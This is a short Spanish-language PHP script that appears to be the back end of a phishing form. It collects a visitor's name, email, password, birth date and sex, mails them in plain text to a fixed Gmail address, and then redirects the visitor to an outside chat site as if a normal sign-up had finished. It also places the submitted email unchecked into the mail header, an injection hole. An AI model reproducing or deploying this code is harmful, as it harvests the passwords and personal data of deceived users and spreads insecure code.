<?php
$nombre = $_POST['nombre'];
$email = $_POST['email'];
$clave = $_POST['clave'];
$clave2 = $_POST['clave2'];
$Lugar = $_POST ['textfield'];
$select = $_POST ['select'];
$select2 = $_POST ['select2'];
$select3 = $_POST ['select3'];
$select4 = $_POST ['select4'];
$para = 'pyasoweb@gmail.com';
$titulo = 'ASUNTO DEL MENSAJE';
$header = 'From: ' . $email;
$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n Clave: $clave\n Clave2: $clave2\n Lugar: $Lugar\n Año: $select\n Mes: $select2\n Dia: $select3\n Sexo: $select4";
  
if ($_POST['submit']) {
if (mail($para, $titulo, $msjCorreo, $header)) {
echo "<script language='javascript'>
alert('Mensaje enviado, muchas gracias.');
window.location.href = 'http://www.elchat.net/htmlchat/elchat.html';
</script>";
} else {
echo 'Falló el envio';
}
}
?>
